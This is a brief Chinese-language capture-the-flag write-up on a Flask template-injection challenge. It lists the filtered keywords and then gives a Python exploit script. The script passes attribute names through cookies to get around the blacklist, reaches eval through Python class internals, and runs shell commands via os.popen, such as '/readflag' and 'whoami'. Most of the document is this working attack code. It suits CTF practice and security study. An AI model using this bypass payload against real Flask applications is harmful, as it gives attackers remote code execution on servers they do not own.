# eg1
Flask SSTI 漏洞，通过 fuzz 可以得知，过滤了如下内容：



```
['message', 'listdir', 'self','url_for','_','"',"os","read","cat","more", "`", "[", "]", "class", "config", "+", "eval", "exec", "join", "import", "popen", "system", "header", "arg", "form", "os", "read", "write", "flag", "ls", "ll", "sort", "nl", " ", ";", ":", "\\"]
```

但是，题目没有过滤 . | () 等，可以使用 request.cookies 来输入内容，绕过检查：


```py
import requests
import re

def regexp_out(data):
    patterns = [
        re.compile(r'(flag{.*?})'),
        re.compile(r'xnuca{(.*?)}'),
        re.compile(r'DASCTF{(.*?)}'),
        re.compile(r'WMCTF{.*?}'),
        re.compile(r'[0-9a-zA-Z]{8}-[0-9a-zA-Z]{3}-[0-9a-zA-Z]{5}'),
    ]

    for pattern in patterns:
        res = pattern.findall(data.decode() if isinstance(data, bytes) else data)
        if len(res) > 0:
            return str(res[0])

    return None

def exp():
    word = '''{{({}|attr(request.cookies.c)|attr(request.cookies.b)|attr(request.cookies.g)(0)|attr(request.cookies.s)()|attr(request.cookies.g)(59)|attr(request.cookies.fa)|attr(request.cookies.fb)|attr(request.cookies.ga)(request.cookies.fc)|attr(request.cookies.ga)(request.cookies.fd)(request.cookies.payload))}}'''

    data = {
        "word": word
    }

    headers = {
        "cookie": "c=__class__; b=__bases__; g=__getitem__; s=__subclasses__; ga= get; fa=__init__; fb=__globals__; fc=__builtins__; fd=eval; payload=__import__('os').popen('whoami').read()"
    }

    cookies = {
        "c": "__class__",
        "b": "__bases__",
        "g": "__getitem__", 
        "s": "__subclasses__",
        "ga": "get",
        "fa":"__init__",
        "fb":"__globals__",
        "fc":"__builtins__", 
        "fd":"eval",
        "payload": "__import__('os').popen('/readflag').read()"
    }

    r = requests.post(url, data={"word": word}, cookies=cookies)

    return regexp_out(r.text)

if __name__ == '__main__':
    print(exp())
```